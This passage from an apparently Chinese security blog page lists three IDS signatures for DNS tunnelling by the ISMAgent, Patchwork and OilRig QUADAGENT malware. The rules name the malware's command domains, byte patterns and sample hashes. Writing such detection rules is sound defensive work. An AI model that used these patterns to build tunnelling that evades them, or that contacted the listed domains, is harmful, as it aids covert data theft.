class="w"> </span>sid:2100208<span class="p">;</span><span class="w"> </span>rev:3<span class="p">;</span><span class="w"> </span>metadata:created_at<span class="w"> </span>2010_09_23,<span class="w"> </span>updated_at<span class="w"> </span>2010_09_23<span class="p">;</span><span class="o">)</span>

sid:2024504<span class="w"> </span><span class="o">(</span>ET<span class="w"> </span>TROJAN<span class="w"> </span>ISMAgent<span class="o">)</span>
alert<span class="w"> </span>udp<span class="w"> </span><span class="nv">$HOME_NET</span><span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="o">(</span>msg:<span class="s2">"ET TROJAN ISMAgent DNS Tunneling (microsoft-publisher . com)"</span><span class="p">;</span><span class="w"> </span>content:<span class="s2">"|01 00 00 01 00 00 00 00 00 00|"</span><span class="p">;</span><span class="w"> </span>depth:10<span class="p">;</span><span class="w"> </span>offset:2<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|13|microsoft-publisher|03|com|00|"</span><span class="p">;</span><span class="w"> </span>nocase<span class="p">;</span><span class="w"> </span>distance:0<span class="p">;</span><span class="w"> </span>fast_pattern<span class="p">;</span><span class="w"> </span>threshold:type<span class="w"> </span>limit,<span class="w"> </span>track<span class="w"> </span>by_src,<span class="w"> </span>count<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>seconds<span class="w"> </span><span class="m">60</span><span class="p">;</span><span class="w"> </span>metadata:<span class="w"> </span>former_category<span class="w"> </span>TROJAN<span class="p">;</span><span class="w"> </span>reference:md5,a70a08a1e17b820c7dc8ee1247d6bfa2<span class="p">;</span><span class="w"> </span>reference:url,researchcenter.paloaltonetworks.com/2017/07/unit42-oilrig-uses-ismdoor-variant-possibly-linked-greenbug-threat-group/<span class="p">;</span><span class="w"> </span>classtype:trojan-activity<span class="p">;</span><span class="w"> </span>sid:2024504<span class="p">;</span><span class="w"> </span>rev:3<span class="p">;</span><span class="w"> </span>metadata:affected_product<span class="w"> </span>Windows_XP_Vista_7_8_10_Server_32_64_Bit,<span class="w"> </span>attack_target<span class="w"> </span>Client_Endpoint,<span class="w"> </span>deployment<span class="w"> </span>Perimeter,<span class="w"> </span>signature_severity<span class="w"> </span>Major,<span class="w"> </span>created_at<span class="w"> </span>2017_07_28,<span class="w"> </span>malware_family<span class="w"> </span>Ismdoor,<span class="w"> </span>performance_impact<span class="w"> </span>Moderate,<span class="w"> </span>updated_at<span class="w"> </span>2017_07_31<span class="p">;</span><span class="o">)</span>

sid:2025072<span class="w"> </span><span class="o">(</span>ET<span class="w"> </span>TROJAN<span class="w"> </span>Patchwork<span class="o">)</span>
alert<span class="w"> </span>dns<span class="w"> </span><span class="nv">$HOME_NET</span><span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span>any<span class="w"> </span><span class="o">(</span>msg:<span class="s2">"ET TROJAN Patchwork DNS Tunneling (nsn1.winodwsupdates .me)"</span><span class="p">;</span><span class="w"> </span>dns_query<span class="p">;</span><span class="w"> </span>content:<span class="s2">".nsn1.winodwsupdates.me"</span><span class="p">;</span><span class="w"> </span>isdataat:!1,relative<span class="p">;</span><span class="w"> </span>metadata:<span class="w"> </span>former_category<span class="w"> </span>TROJAN<span class="p">;</span><span class="w"> </span>reference:url,docs.google.com/document/d/1oYX3uN6KxIX_StzTH0s0yFNNoHDnV8VgmVqU5WoeErc<span class="p">;</span><span class="w"> </span>classtype:trojan-activity<span class="p">;</span><span class="w"> </span>sid:2025072<span class="p">;</span><span class="w"> </span>rev:2<span class="p">;</span><span class="w"> </span>metadata:affected_product<span class="w"> </span>Windows_XP_Vista_7_8_10_Server_32_64_Bit,<span class="w"> </span>attack_target<span class="w"> </span>Client_Endpoint,<span class="w"> </span>deployment<span class="w"> </span>Perimeter,<span class="w"> </span>signature_severity<span class="w"> </span>Major,<span class="w"> </span>created_at<span class="w"> </span>2017_11_27,<span class="w"> </span>malware_family<span class="w"> </span>Patchwork,<span class="w"> </span>performance_impact<span class="w"> </span>Low,<span class="w"> </span>updated_at<span class="w"> </span>2017_11_27<span class="p">;</span><span class="o">)</span>

sid:2025894<span class="w"> </span><span class="o">(</span>ET<span class="w"> </span>TROJAN<span class="w"> </span>OilRig<span class="o">)</span>
alert<span class="w"> </span>dns<span class="w"> </span><span class="nv">$HOME_NET</span><span class="w"> </span>any<span class="w"> </span>-&gt;<span class="w"> </span>any<span class="w"> </span><span class="m">53</span><span class="w"> </span><span class="o">(</span>msg:<span class="s2">"ET TROJAN OilRig QUADAGENT DNS Tunneling"</span><span class="p">;</span><span class="w"> </span>content:<span class="s2">"|01|"</span><span class="p">;</span><span class="w"> </span>offset:2<span class="p">;</span><span class="w"> </span>depth:1<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|00 01 00 00 00 00 00|"</span><span class="p">;</span><span class="w"> </span>distance:1<span class="p">;</span><span class="w"> </span>within:7<span class="p">;</span><span class="w"> </span>content:<span class="s2">"|04|mail|06|"</span><span class="p">;</span><span class="w"> </span>distance:0<span class="p">;</span><span class="w"> </span>nocase<span class="p">;</span><span class="w"> </span>pcre:<span class="s2">"/^\d{6}/Ri"</span><span class="p">;</span><span class="w"> </span>content:<span class="s2">"|07|cpuproc|03|com|00|"</span><span class="p">;</span><span class="w"> </span>fast_pattern<span class="p">;</span><span class="w"> </span>distance:0<span class="p">;</span><span class="w"> </span>within:13<span class="p">;</span><span class="w"> </span>nocase<span class="p">;</span><span class="w"> </span>threshold:<span class="w"> </span><span class="nb">type</span><span class="w"> </span>limit,<span class="w"> </span>count<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>seconds<span class="w"> </span><span class="m">60</span>,<span class="w"> </span>track<span class="w"> </span>by_src<span class="p">;</span><span class="w"> </span>metadata:<span class="w"> </span>former_category<span class="w"> </span>TROJAN<span class="p">;</span><span class="w"> </span>reference:md5,d51c2ffce844d42bab2f2c3131e3dbd4<span class="p">;</span><span class="w"> </span>reference:url,researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/<span class="p">;</span><span class="w"> </span>classtype:trojan-activity<span class="p">;</span><span class="w"> </span>sid:2025894<span class="p">;</span><span class="w"> </span>rev:2<span class="p">;</span><span class="w"> </span>metadata:affected_product<span class="w"> </span>Windows_XP_Vista_7_8_10_Server_32_64_Bit,<span class="w"> </span>attack_target<span class="w"> </span>Client_Endpoint,<span class="w"> </span>deployment<span class="w"> </span>Perimeter,<span class="w"> </span>signature_severity<span class="w"> </span>Major,<span class="w"> </span>created_at<span class="w"> </span>2018_07_25,<span class="w"> </span>malware_family<span class="w"> </span>QuadAgent,<span class="w"> </span>performance_impact<span class="w"> </span>Low,<span class="w"> </span>updated_at<span class="w"> </span>2018_07_25<span class="p">;</span><span class="o">)</span>
</code></pre></div>
  </div>
</article>
<div id="cyReward" role="cylabs" data-use="reward" style="text-align:center;"></div>
<!--PC和WAP自适应版-->
<div id="SOHUCS" ></div> 
<script type="text/javascript"> 
(function(){ 
var appid = 'cysYUIjwy'; 
var conf = 'prod_71b5e53cad0d27b5ed44fa5219b069b5'; 
var width = window.innerWidth || document.documentElement.clientWidth; 
if (width < 960) { 
window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("https://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>

<script type="text/javascript" charset="utf-8" src="https://changyan.itc.cn/js/lib/jquery.js"></script>
<script type="text/javascript" charset="utf-8" src="https://changyan.sohu.com/js/changyan.labs.https.js?appid=cysYUIjwy"></script>    </div>
  </div>

  <footer class="footer">
    <div class="container">
      <div class="row">
       <ul class="col-sm-6 list-inline">
          <li class="list-inline-item"><a href="https://www.njcx.bid/authors.html">Authors</a></li>
          <li class="list-inline-item"><a href="https://www.njcx.bid/archives.html">Archives</a></li>
          <li class="list-inline-item"><a href="https://www.njcx.bid/categories.html">Categories</a></li>
          <li class="list-inline-item"><a href="https://www.njcx.bid/tags.html">Tags</a></li>
        </ul>
        <p class="col-sm-6 text-sm-right text-muted">
          本站由 <a href="https://github.com/getpelican/pelican" target="_blank">Pelican 生成</a> 后续 by <a href="https://github.com/njcx" target="_blank">nJcx</a>
        </p>
      </div>
    </div>
  </footer>
</body>

</html>